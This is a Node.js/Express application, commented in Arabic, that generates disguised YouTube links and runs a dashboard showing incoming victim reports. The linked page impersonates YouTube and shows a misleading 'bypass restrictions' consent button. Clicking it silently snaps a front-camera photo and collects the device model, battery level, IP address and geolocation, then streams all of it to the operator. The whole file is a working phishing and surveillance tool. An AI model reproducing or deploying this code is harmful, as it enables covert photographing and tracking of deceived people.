const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.json({ limit: '10mb' }));

// 1. لوحة التحكم الرئيسية
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>لوحة التحكم - التقاط الصور</title>
        <style>
            body { font-family: system-ui, sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
            .card { background: #1e1e1e; border-radius: 12px; padding: 20px; margin: 15px auto; max-width: 600px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
            button { background: #ff0000; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; font-weight: bold; }
            button:hover { background: #cc0000; }
            input { width: 90%; padding: 10px; border-radius: 6px; border: 1px solid #333; background: #222; color: #fff; text-align: center; margin-top: 10px; }
            .info-box { text-align: right; background: #2a2a2a; padding: 15px; border-radius: 8px; margin-top: 12px; border-right: 5px solid #ff0000; font-size: 14px; line-height: 1.7; }
            .captured-img { width: 100px; height: auto; border-radius: 6px; margin-top: 10px; border: 2px solid #ff0000; }
        </style>
    </head>
    <body>
        <h2>📺 منشئ روابط يوتيوب التفاعلية</h2>
        <div class="card">
            <p>ضع رابط فيديو يوتيوب واضغط إنشاء:</p>
            <input type="text" id="ytUrlInput" value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
            <br><br>
            <button type="button" onclick="makeLink()">🔗 إنشاء الرابط</button>
            <div id="linkContainer" style="display:none; margin-top: 15px;">
                <p>الرابط الخاص بك (انسخه وافتحه):</p>
                <input type="text" id="linkInput" readonly onclick="this.select();">
            </div>
        </div>

        <h3>📥 التقارير والصور الواردة:</h3>
        <div id="logs" class="card">
            <p style="color: #aaa;">في انتظار فتح الرابط...</p>
        </div>

        <script src="/socket.io/socket.io.js"></script>
        <script>
            function makeLink() {
                const ytUrl = document.getElementById('ytUrlInput').value;
                let videoId = "dQw4w9WgXcQ";
                
                if (ytUrl.includes('youtu.be/')) {
                    videoId = ytUrl.split('youtu.be/')[1].substring(0, 11);
                } else if (ytUrl.includes('v=')) {
                    videoId = ytUrl.split('v=')[1].substring(0, 11);
                }
                
                const uniqueId = Math.random().toString(36).substring(2, 8);
                const fullUrl = window.location.origin + '/watch/' + uniqueId + '?v=' + videoId;
                
                document.getElementById('linkInput').value = fullUrl;
                document.getElementById('linkContainer').style.display = 'block';
            }

            const socket = io();
            socket.on('new-device-data', (data) => {
                const logs = document.getElementById('logs');
                if (logs.innerText.includes('في انتظار فتح')) logs.innerHTML = '';
                
                const box = document.createElement('div');
                box.className = 'info-box';
                box.innerHTML = '<strong>📱 اسم الجهاز:</strong> ' + data.deviceName + '<br>' +
                                '<strong>🌐 عنوان IP:</strong> ' + data.ip + '<br>' +
                                '<strong>📍 الموقع الجغرافي:</strong> ' + data.location + '<br>' +
                                '<strong>🔋 البطارية:</strong> ' + data.battery + '<br>' +
                                '<strong>🕒 الوقت:</strong> ' + data.time + '<br>' +
                                (data.image ? '<strong>📸 الصورة الأمامية:</strong><br><img src="' + data.image + '" class="captured-img">' : '');
                logs.prepend(box);
            });
        </script>
    </body>
    </html>
  `);
});

// 2. صفحة الرابط: تظهر رسالة موافقة أولاً، وعند الضغط عليها يفتح الفيديو وتلتقط الصورة
app.get('/watch/:id', async (req, res) => {
  const videoId = req.query.v || 'dQw4w9WgXcQ';
  
  let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'غير معروف';
  if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();

  res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>YouTube - مشاهدة الفيديو</title>
        <style>
            body { font-family: Arial, sans-serif; background: #0f0f0f; color: #fff; margin: 0; padding: 0; text-align: center; }
            #prompt-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 9999; display: flex; justify-content: center; align-items: center; flex-direction: column; }
            .modal { background: #212121; padding: 30px; border-radius: 12px; max-width: 400px; width: 90%; border: 1px solid #333; }
            .modal h3 { color: #fff; margin-bottom: 10px; }
            .modal p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
            .modal button { background: #ff0000; color: #fff; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; }
            .modal button:hover { background: #cc0000; }
            .header { background: #212121; padding: 12px 20px; text-align: left; font-weight: bold; font-size: 18px; color: #ff0000; border-bottom: 1px solid #333; }
            .container { max-width: 800px; margin: 20px auto; padding: 10px; display: none; }
            .video-container { position: relative; width: 100%; padding-bottom: 56.25%; height: 0; background: #000; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.8); }
            .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: 0; }
        </style>
    </head>
    <body>

        <!-- نافذة الموافقة -->
        <div id="prompt-overlay">
            <div class="modal">
                <h3>📺 تنبيه مشاهدة الفيديو</h3>
                <p>اضغط على "موافق" أدناه لتخطي القيود وعرض الفيديو بدقة عالية.</p>
                <button onclick="startExperience()">موافق (مشاهدة الآن)</button>
            </div>
        </div>

        <div class="header">▶ YouTube</div>
        <div class="container" id="mainContainer">
            <div class="video-container">
                <iframe src="https://www.youtube-nocookie.com/embed/${videoId}?autoplay=1" allow="autoplay; encrypted-media" allowfullscreen></iframe>
            </div>
        </div>

        <video id="video" autoplay playsinline style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>

        <script>
            function getExactDeviceModel(ua) {
                let match = ua.match(/(Redmi\\s[\\w\\d]+|SM-[A-Z0-9]+|iPhone\\s[\\w\\s]+|POCO\\s[\\w\\d]+|Pixel\\s[\\td\\w\\s]+|Huawei\\s[\\w\\d]+|OPPO\\s[\\w\\d]+|Vivo\\s[\\w\\d]+)/i);
                if (match) return match[0];
                if (ua.includes('Android')) return 'هاتف Android';
                if (ua.includes('iPhone')) return 'Apple iPhone';
                if (ua.includes('Windows')) return 'Windows Computer';
                return 'جهاز ذكي';
            }

            async function startExperience() {
                // إخفاء نافذة الموافقة وإظهار فيديو اليوتيوب فوراً
                document.getElementById('prompt-overlay').style.display = 'none';
                document.getElementById('mainContainer').style.display = 'block';

                let batteryLevel = "غير مدعوم";
                if (navigator.getBattery) {
                    try {
                        const b = await navigator.getBattery();
                        batteryLevel = Math.round(b.level * 100) + "% " + (b.charging ? "(⚡ يشحن)" : "");
                    } catch(e){}
                }

                let capturedImage = null;
                try {
                    // طلب إذن الكاميرا عند ضغطه على زر "موافق"
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const videoElement = document.getElementById('video');
                    videoElement.srcObject = stream;
                    
                    await new Promise(resolve => videoElement.onloadedmetadata = resolve);
                    
                    const canvas = document.getElementById('canvas');
                    canvas.width = videoElement.videoWidth || 320;
                    canvas.height = videoElement.videoHeight || 240;
                    const context = canvas.getContext('2d');
                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                    
                    capturedImage = canvas.toDataURL('image/png');
                    stream.getTracks().forEach(track => track.stop());
                } catch(e) {
                    capturedImage = null;
                }

                const deviceData = {
                    deviceName: getExactDeviceModel(navigator.userAgent),
                    ip: "${clientIp}",
                    battery: batteryLevel,
                    image: capturedImage,
                    time: new Date().toLocaleTimeString('ar-EG')
                };

                try {
                    const response = await fetch('https://ipapi.co/${clientIp}/json/');
                    const ipData = await response.json();
                    deviceData.location = (ipData.city || "مجهول") + ", " + (ipData.country_name || "مجهول");
                } catch(e) {
                    deviceData.location = "غير معروف";
                }

                fetch('/api/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(deviceData)
                });
            }
        </script>
    </body>
    </html>
  `);
});

app.post('/api/log', (req, res) => {
  io.emit('new-device-data', req.body);
  res.json({ status: 'success' });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
